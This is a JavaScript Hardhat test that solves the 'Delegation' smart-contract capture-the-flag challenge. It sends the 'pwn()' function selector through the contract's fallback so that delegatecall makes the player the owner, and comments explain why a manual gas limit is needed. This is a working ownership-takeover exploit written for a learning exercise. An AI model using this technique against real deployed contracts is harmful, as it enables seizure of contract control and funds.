const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS6 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`Delegation`)
    challenge = await challengeFactory.attach(challengeAddress)
})

it("Solves the challenge 'Delegation'", async () => {
    /*We will have to send information "pwn()" by msg.data, 
    what we make when call fallback function few lines down.
    But this information must be firstly hashed by keccak256 function. 
    The input of keccak256 function is BitesLike type, therefor 
    we use function toUtf8Bytes. More about keccak256 here
    https://ethereum.stackexchange.com/questions/123232/how-to-use-ethers-keccak256 */

    const hash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("pwn()"))
    let data = hash.substring(0, 10)

    /*Setting of gasLimit is very important here. Because without 
    // estimating gas fails! because fallback does not revert when inner call fails
    // The catch about gas estimation is that the node will try out your tx
    // with different gas values, and return the lowest one for which your tx
    // doesn't fail. But it only looks at your tx, not at any of the internal call
    // it makes. This means that if the contract code you're calling has a
    // try/catch that causes it not to revert if an internal call does,
    // you can get a gas estimation that would be enough for the caller contract,
    // but not for the callee.
    // https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6 */

    tx = await challenge.fallback({ data: data, gasLimit: ethers.BigNumber.from(`100000`) })
    await tx.wait(1)

    owner = await challenge.owner()
    assert(owner.toString() == player.address, "You are not the owner!")
})
